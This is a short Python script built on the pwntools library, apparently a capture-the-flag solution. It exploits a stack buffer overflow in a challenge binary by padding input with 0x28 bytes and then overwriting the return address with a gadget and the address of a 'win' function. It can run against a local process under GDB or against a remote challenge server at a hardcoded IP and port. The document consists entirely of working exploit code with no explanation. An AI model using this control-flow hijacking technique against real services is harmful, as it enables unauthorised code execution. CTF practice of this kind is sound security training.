#!/usr/bin/env python3

from pwn import *

PATH = 'app/chall'

HOST = 'localhost'
HOST = '103.167.136.89'
PORT = 10021

GDBSCRIPT = '''
set resolve-heap-via-heuristic on
b *test_server+110
'''

def debug(r):
    if type(r) == process:
        gdb.attach(r, GDBSCRIPT)

def exploit(r):
    debug(r)

    pause()

    r.sendlineafter(b'Select your option:\n', b'1')
    r.sendlineafter(b'What would you like to send to the server?\n', b'A' * 0x28 + p64(0x401354) + p64(elf.sym.win))
    # r.sendlineafter(b'What would you like to send to the server?\n', b'A' * 0x28 + p64(elf.sym.win))
    
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    # libc = elf.libc
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)